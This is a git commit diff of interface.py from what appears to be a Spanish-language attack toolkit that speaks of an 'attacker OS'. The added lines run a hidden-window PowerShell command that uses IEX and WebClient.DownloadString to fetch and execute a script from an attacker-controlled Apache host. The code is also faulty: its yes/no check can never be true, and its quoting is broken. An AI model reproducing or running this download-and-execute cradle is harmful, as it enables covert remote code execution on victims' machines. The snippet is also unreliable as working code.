584973f4c5d2aee779eb29ec8ce5867bb5ebd764
Aaron-AOH <118374763+Aaron-AOH@users.noreply.github.com>
2023-02-27 12:43:13 +0100

    Update interface.py

--- interface.py
+++ interface.py
@@ -17,8 +17,11 @@ if comando ==1:
 if comando == 2:
   print("Para transferir archivos debe abrir admin_transfer.py en el OS atacante. comand = <python3 admin_transfer.py>")
   question = input("Cuando haya realizado la tarea necesaria escriba [Y] or [y] para continuar.")
-  if question=="y" and question=="Y":
-     os.system('transfer-files.py')
+  if question=="y" and question=="Y":   
+       clearScr()
+       os.system('powershell -noexit -windowstyle hidden -c IEX(New-Object System.Net.WebClient).DownloadString(\'http://"+ apache_ip +"/*\'))
+       
+
       
 if comando == 3:
       
